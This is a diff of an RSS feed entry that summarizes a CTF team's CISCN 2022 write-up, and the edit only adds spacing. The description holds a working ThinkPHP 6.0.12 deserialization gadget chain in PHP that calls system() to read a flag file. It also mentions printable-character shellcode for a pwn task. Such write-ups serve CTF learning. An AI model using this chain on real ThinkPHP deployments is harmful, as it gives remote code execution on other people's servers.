@@ -13,8 +13,8 @@
       <pubDate>Wed, 01 Jun 2022 17:17:17 +0800</pubDate>
       
       <guid>https://or4ngesec.github.io/post/ciscn-2022-writeup-by-or4nge/</guid>
-      <description>Web ezpop tp6.0.12的反序列化洞，直接用现成的链的打就行
-&amp;lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = &amp;#39;&amp;#39;){ $this-&amp;gt;lazySave = True; $this-&amp;gt;data = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#34;cat /flag.txt&amp;#34;]]; $this-&amp;gt;exists = True; $this-&amp;gt;table = $obj; $this-&amp;gt;withAttr = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#39;system&amp;#39;]]; $this-&amp;gt;json = [&amp;#39;key&amp;#39;,[&amp;#39;key&amp;#39;]]; $this-&amp;gt;jsonAssoc = True; } } } namespace think\model{ use think\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot())))); } Pwn login-nomal 可见字符shellcode，调用ae64脚本，rdx直接打通</description>
+      <description>Web ezpop tp6.0.12 的反序列化洞，直接用现成的链的打就行
+&amp;lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = &amp;#39;&amp;#39;){ $this-&amp;gt;lazySave = True; $this-&amp;gt;data = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#34;cat /flag.txt&amp;#34;]]; $this-&amp;gt;exists = True; $this-&amp;gt;table = $obj; $this-&amp;gt;withAttr = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#39;system&amp;#39;]]; $this-&amp;gt;json = [&amp;#39;key&amp;#39;,[&amp;#39;key&amp;#39;]]; $this-&amp;gt;jsonAssoc = True; } } } namespace think\model{ use think\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot())))); } Pwn login-nomal 可见字符 shellcode，调用 ae64 脚本，rdx 直接打通</description>
     </item>
     
     <item>
